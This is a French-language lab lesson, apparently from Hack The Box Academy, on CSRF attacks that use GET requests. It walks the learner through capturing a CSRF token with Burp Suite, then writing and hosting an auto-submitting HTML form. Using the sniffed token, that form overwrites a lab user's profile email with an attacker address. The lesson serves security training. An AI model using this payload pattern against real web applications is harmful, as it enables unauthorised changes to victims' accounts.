Cross-Site Request Forgery (basée sur GET)
===========================================

De la même manière que nous pouvons extraire les cookies de session des applications qui n'utilisent pas le cryptage SSL, nous pouvons faire de même concernant les jetons CSRF inclus dans les demandes non cryptées.

Voyons un exemple.

Allez à la fin de cette section et cliquez sur `Click here to spawn the target system!`ou l' `Reset Target`icône , puis utilisez la Pwnbox fournie ou une VM locale avec la clé VPN fournie pour pouvoir atteindre l'application cible et suivre. Ensuite, configurez le vhost ( `csrf.htb.net`) spécifié pour accéder à l'application.

Accédez `http://csrf.htb.net`à l'application et connectez-vous à l'aide des informations d'identification ci-dessous :

-   Courriel : heavycat106
-   Mot de passe : rocknrol

Il s'agit d'un compte que nous avons créé pour examiner les fonctionnalités de l'application.

Maintenant, parcourez le profil de Julie Rogers et cliquez sur *Enregistrer* . Vous devriez voir ci-dessous. ![image](https://academy.hackthebox.com/storage/modules/153/32.png)

Activez le proxy de burp suite ( *Intercept On* ) et configurez votre navigateur pour le parcourir. Maintenant, cliquez à nouveau sur *Enregistrer* .

Vous devriez voir ci-dessous.

![image](https://academy.hackthebox.com/storage/modules/153/31.png)

Le jeton CSRF est inclus dans la requête GET.

Simulons un attaquant sur le réseau local qui a reniflé la requête susmentionnée et veut défigurer le profil de Julie Rogers par une attaque CSRF. Bien sûr, ils auraient pu simplement effectuer une attaque de piratage de session en utilisant le cookie de session reniflé.

Tout d'abord, créez et servez la page HTML ci-dessous. Enregistrez-le sous`notmalicious_get.html`

Code : html

```
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>

```

Notez que la valeur du jeton CSRF ci-dessus est la même que la valeur du jeton CSRF dans la requête capturée/"sniffée".

Si vous vous demandez comment nous avons créé le formulaire ci-dessus basé sur la requête GET interceptée, veuillez étudier la ressource suivante [Envoi des données du formulaire](https://developer.mozilla.org/en-US/docs/Learn/Forms/Sending_and_retrieving_form_data)

Vous pouvez servir la page ci-dessus depuis votre machine attaquante comme suit.

```
dsgsec@htb[/htb]$ python -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...

```

Tout en restant connecté en tant que Julie Rogers, ouvrez un nouvel onglet et visitez la page que vous servez depuis votre machine d'attaque `http://<VPN/TUN Adapter IP>:1337/notmalicious_get.html`. Vous remarquerez que les détails du profil de Julie Rogers seront remplacés par ceux que nous avons spécifiés dans la page HTML que vous servez.

![image](https://academy.hackthebox.com/storage/modules/153/34.png)

Dans la section suivante, nous allons attaquer une application soumettant le jeton CSRF via POST sans avoir à résider dans le réseau local.
